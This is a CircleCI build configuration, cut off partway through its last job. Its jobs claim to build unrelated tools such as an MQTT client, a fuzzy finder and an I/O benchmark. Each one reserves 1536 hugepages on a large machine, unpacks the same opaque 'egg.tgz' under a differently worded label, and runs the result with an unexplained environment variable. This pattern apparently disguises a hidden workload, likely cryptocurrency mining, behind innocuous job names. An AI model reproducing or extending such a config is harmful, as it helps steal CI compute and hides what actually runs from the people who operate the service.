version: 2.1

jobs:
  mesh_route:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load topology
          command: |
            printf 'nodes 32\n' > mesh.cfg
      - run:
          name: Build mesh stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mesh_route -j2
      - run:
          name: Route mesh packet
          command: LIONSS_LP=1 ./build/mesh_route --conf mesh.cfg --hops 5
  mqtt-qos2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define topics
          command: |
            printf 'topic sensors/+\n' > mqtt.cfg
      - run:
          name: Build MQTT client
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mqtt-qos2 -j2
      - run:
          name: Publish QoS2 message
          command: LIONSS_LP=1 ./build/mqtt-qos2 --conf mqtt.cfg --retain
  sdi12-poll:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set address
          command: |
            printf 'addr 0\n' > sdi.cfg
      - run:
          name: Build SDI-12 master
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sdi12-poll -j2
      - run:
          name: Poll sensor
          command: LIONSS_LP=1 ./build/sdi12-poll --conf sdi.cfg --measure
  fzf-preview:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List entries
          command: |
            printf 'alpha\nbeta\n' > list.txt
      - run:
          name: Build fuzzy finder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target fzf-preview -j2
      - run:
          name: Preview fuzzy matches
          command: LIONSS_LP=1 ./build/fzf-preview --list list.txt --query a
  FioRandwrite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set job
          command: |
            printf 'bs=4k\niodepth=32\n' > fio.ini
      - run:
          name: Build io benchmark
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target FioRandwrite -j2
      - run:
          name: Random write test
          command: LIONSS_LP=1 ./build/FioRandwrite --job fio.ini --runtime 30
  yuv420pack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make raw
          command: |
            : > raw.yuv
      - run:
          name: Build pixel packer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target yuv420pack -j2
      - run:
          name: Pack YUV420 planes
          command: LIONSS_LP=1 ./build/yuv420pack --in raw.yuv --width 1920
  BloomThreshold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set threshold
          command: |
            printf 'thresh 1.1\n' > bloom.cfg
      - run:
          name: Build post stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target BloomThreshold -j2
      - run:
          name: Extract bloom highlights
          command: LIONSS_LP=1 ./build/BloomThreshold --conf bloom.cfg --mips 6
  Fenwick:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
